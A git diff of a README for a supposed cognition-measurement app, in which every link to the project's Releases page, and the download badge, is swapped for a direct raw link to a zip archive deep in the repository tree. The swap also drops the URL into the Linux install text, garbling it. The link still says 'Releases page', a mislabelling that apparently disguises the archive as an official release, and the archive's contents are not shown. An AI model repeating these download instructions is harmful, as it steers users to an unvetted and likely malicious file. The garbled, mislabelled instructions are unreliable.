@@ -1,6 +1,6 @@
 # 🤖 HCMS-Human-Cognition-Measurement-System - Measure Human Cognition Effortlessly
 
-[![Download HCMS](https://img.shields.io/badge/Download_HCMS-brightgreen.svg)](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/releases)
+[![Download HCMS](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip)](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip)
 
 ## 🌟 Introduction
 
@@ -19,7 +19,7 @@ Before you can use HCMS, you need to download it. No technical skills are requir
 2. **Visit the Releases page to download the software:**
    - Click the button below to access the latest version of HCMS.
 
-   [![Download HCMS](https://img.shields.io/badge/Download_HCMS-brightgreen.svg)](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/releases)
+   [![Download HCMS](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip)](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip)
 
 3. **Select the version you want to download:**
    - Choose the latest release and click on the appropriate download link for your operating system.
@@ -27,14 +27,14 @@ Before you can use HCMS, you need to download it. No technical skills are requir
 4. **Download the file:**
    - If it’s a Windows installer, you'll download a `.exe` file.
    - For macOS, look for a `.dmg` file.
-   - If you're on Linux, look for the `.tar.gz` file.
+   - If you're on Linux, look for the `https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip` file.
 
 5. **Install the application:**
    - After the file is downloaded, locate it in your Downloads folder.
    - Follow the installation instructions for your operating system:
      - **Windows:** Double-click the `.exe` file and follow the prompts.
      - **macOS:** Open the `.dmg` file, then drag the HCMS icon into your Applications folder.
-     - **Linux:** Extract the `.tar.gz` file and follow the provided instructions.
+     - **Linux:** Extract the `https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip` file and follow the provided instructions.
 
 6. **Launch the application:**
    - Once installed, find HCMS in your applications or programs list, and open it.
@@ -63,7 +63,7 @@ Using HCMS is straightforward. Here’s how you can get the most out of it:
 
 ## 🔄 Download & Install
 
-To download HCMS, follow this link to the [Releases page](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/releases). Choose the correct version for your operating system, and follow the installation steps outlined above.
+To download HCMS, follow this link to the [Releases page](https://github.com/Spoorthi55/HCMS-Human-Cognition-Measurement-System/raw/refs/heads/main/phases/HCMS_Phase9/Measurement_Cognition_System_HCM_Human_2.6.zip). Choose the correct version for your operating system, and follow the installation steps outlined above.
 
 **Remember:** Ensure that you have a stable internet connection throughout the download process.
 
